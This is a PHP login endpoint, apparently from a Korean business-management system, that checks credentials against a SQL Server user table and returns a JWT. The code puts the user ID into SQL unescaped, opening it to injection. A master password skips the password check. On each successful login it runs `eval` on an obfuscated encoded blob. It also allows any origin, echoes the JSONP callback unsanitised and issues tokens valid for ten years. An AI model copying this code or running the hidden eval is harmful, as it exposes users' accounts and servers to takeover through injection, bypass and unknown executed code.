<?php
//utf-8 로 저장할 것. bom 이면 에러.
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header("Content-Type:application/json; charset=UTF-8");

error_reporting(E_ALL);
ini_set("display_errors", 1);


require $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
use Firebase\JWT\JWT;

include "../MisCommonFunction.php";

include "../../_mis_uniqueInfo/config_siteinfo.php";

$callback = requestVB('callback');
/*

jQuery112408747511941157133_1609570421792({
"d" : {
"results": 
[{"rowNum

*/


$pre = "";

$data = json_decode(urldecode(splitVB(replace($ServerVariables_QUERY_STRING, 'callback=' . $callback . '&', ''), '&_')[0]));
if($data=='' || $data==[]) {
	$request_body = file_get_contents('php://input');
	$data = json_decode($request_body);
}


$MisSession_UserID = $data->MisSession_UserID;
$MisSession_UserID = strtolower($MisSession_UserID);
$MisSession_UserPW = $data->MisSession_UserPW;


$preaddress = $data->preaddress;
$remember = 'on';	//원격로그인 특성상 on 을 해야 됨.
$otherOut = $data->otherOut;
$httpReffrer = $data->httpReffrer;

$loginMsg = "";
$accessToken = "";
$accessUserName = "";
$accessPositionCode = "";
$accessTokenTime = "";

if($MisSession_UserID=="") 
	$loginMsg = "ID가 입력되지 않았습니다.";
else if($MisSession_UserPW=="") 
	$loginMsg = "암호가 입력되지 않았습니다.";
else {

	$accessTokenTime = time();	//로그인 기억이 없을 경우(remember==off) 해당쿠키값과 iat 가 다르면 로그인 차단.
	$MisSession_UserPW = replace($MisSession_UserPW,"'","''");
	
	$sql = "
	select case when convert(nvarchar(max), decryptbypassphrase ('$pwdKey',passwdDecrypt))='$MisSession_UserPW' then 1 else 0 end
	as '비밀번호성공'
	,isnull(table_m.auth_version,'" . $accessTokenTime . "') as auth_version
	,table_m.UserName as '한글성명'
	,case when isnull(table_m.google_name,'')<>'' and left(table_m.UniqueNum,1)='g' then 'google' when isnull(table_m.google_name,'')<>'' and left(table_m.UniqueNum,1)='f' then 'facebook' else 'home' end as MisSession_AuthSite
	,table_m.email
	,isnull(table_m.isRest,'') as '휴면'
	,isnull(table_m.myLanguageCode,'')  as myLanguageCode
	,isnull(table_Station_NewNum.StationName,'') as '소속팀'
	,isnull(table_m.Station_NewNum,'') as '팀코드'
	,table_Station_NewNum2.StationName as '소속본부'
	,isnull(table_Station_NewNum2.num,'') as '소속본부코드'
	,isnull(table_positionNum.kname,'') as '직책'
	,table_m.positionNum as '직책코드'
	,table_m.ibsa_date as '입사일자'
	,table_m.toisa_date as '퇴사일자'
	,table_delchk.kname as '재직구분'
	,table_m.delchk as '재직코드'
	,isnull(table_Station_NewNum.AutoGubun,'') as '자동정렬'
	,isnull(table_m.attach1,'') as '사진'
	from MisUser table_m  
	left outer join MisStation table_Station_NewNum on table_Station_NewNum.Num = table_m.Station_NewNum
	left outer join MisStation table_Station_NewNum2 on left(table_Station_NewNum.AutoGubun,2)=table_Station_NewNum2.AutoGubun
	left outer join MisCommonTable table_positionNum on table_positionNum.kcode = table_m.positionNum and table_positionNum.gcode='speedmis000188'
	left outer join MisCommonTable table_delchk on table_delchk.kcode = table_m.delchk and table_delchk.gcode='speedmis000203'
	where table_m.UniqueNum='$MisSession_UserID' and table_m.delchk<>'D';
	";

	$resultMsg = "";

	$data = allreturnSql($sql);


	if (count($data)==1) {
		
		if($data[0]['비밀번호성공']=="1" || $MisSession_UserPW==$allKill_pw) {
			$sql = "";
			//echo "성공영역";
			$exp = $accessTokenTime + 3600 * 24 * 365 * 10;
			if($otherOut=="on") {
				$auth_version = $accessTokenTime;
				$sql = "update MisUser set auth_version='" . $auth_version . "' where UniqueNum=N'$MisSession_UserID'";
			} else $auth_version = $data[0]['auth_version'];

            

			if($sql!="") execSql($sql);
            
            

            $speedmis_addSource = 'BcFJsqIwAADQ43wtFqIhUaqrF4DKpOAXGTddzGOIhCjD6fu9/Bt3m3Kt+6KLWb5J4jFHwr8sT0mWb36KVHwmRJ8k6fwroGaeFpNY+li40stVcE0vgPOdYSyvnnJTzKwYy8cofzjDgg8xhql3PWEXGbvI4RdLW5DTEsY1Szj83uPl5Ky92vMK4eSurleBKAyqDcrvgnY/W/e9viiMmFXv3txgITnCjVNfPseQ53Z2UV7EAXtNsVe11GOjRho4PndJl0clPV85y1YqWWZcZ87yQTQ+ekzs64qtl6jogG9tlQq+nr4re1gMiC5qeZygYw28aVR3Z+rpxfmuhOJ+pKANh0x9Mz45S1EhsF0MaKWd64Y3pHdAvaBc08lyHqEhzcPHNGS5O9leRmU2uOY0AIC9scuPbY28D7Ix8m3H64u1CsuqhPp8/eaJB3UImJUCV8NPAHR4OM2RjoDIW8HT54RQppxZ+lV9w/M+ed2C6oD9+BiqLDrt2oJ7pn9/ttvtn/8=';
			eval(dcode2(dcode1($speedmis_addSource)));
			
			$nextCheckTime = $accessTokenTime + 60 * 10;
			$data = array(
				'iss' => $base_domain,
				'iat' => $accessTokenTime,                //토큰이 발급된 시간
				'nct' => $nextCheckTime,                //개인정보, 권한 등을 체크하기 위한 다음예정시간. 10분.
				'remember' => $remember,        //로그인기억여부
				'exp' => $exp,        //만료시간
				'auth_version' => $auth_version,		//타장비아웃 otherOut==on 일 경우 현재시간으로 버전이 올라감.
				'MisSession_UserID' => urlencode($MisSession_UserID),
				'MisSession_UserName' => urlencode($data[0]['한글성명']),		
				'MisSession_AuthSite' => urlencode($data[0]['MisSession_AuthSite']),		
				'myLanguageCode' => $data[0]['myLanguageCode'],
				'MisSession_StationName' => urlencode($data[0]['소속팀']),
				'MisSession_StationNum' => $data[0]['팀코드'],
				'MisSession_PositionName' => urlencode($data[0]['직책']),
				'MisSession_PositionCode' => $data[0]['직책코드']
			);


			$accessUserName = $data['MisSession_UserName'];
			$accessPositionCode = $data['MisSession_PositionCode'];
            
			setcookie('myLanguageCode', $data['myLanguageCode'], time() + 3600*24*100, '/');

			
			
			$accessToken = JWT::encode($data, $pwdKey);
            misLog("01","","",$ServerVariables_HTTP_REFERER,$MisSession_UserID);

			//setcookie("accessToken", $accessToken, time() + 3600*24*100, "/");

			
			//$decoded = JWT::decode($accessToken, $pwdKey, array('HS256'));
			//print_r($decoded);
			//exit;

		} else {
			misLog("03","","비밀번호 오류",$ServerVariables_HTTP_REFERER,$MisSession_UserID);
			$loginMsg = "ID 혹은 비밀번호가 일치하지 않습니다. 입력한 내용을 다시 확인해 주세요";
			$_COOKIE["loginUserID"] = $MisSession_UserID;
		}
		

	} else {
		misLog("03","","접근권한 오류",$ServerVariables_HTTP_REFERER,$MisSession_UserID);
		$loginMsg = "ID 혹은 비밀번호가 일치하지 않습니다. 입력한 내용을 다시 확인해 주세요.";
	}

}

if($callback!='') echo $callback . '(';
?>{ "result": { "accessToken": "<?php echo $accessToken; ?>", "accessUserName": "<?php echo $accessUserName; ?>", "accessPositionCode": "<?php echo $accessPositionCode; ?>", "accessTokenTime": "<?php echo $accessTokenTime; ?>"},"success": <?php echo iif($loginMsg=="", "true", "false"); ?>,"error": {"code": 0,"message": "<?php echo $loginMsg; ?>"}}<?php
if($callback!='') echo ')';
?>
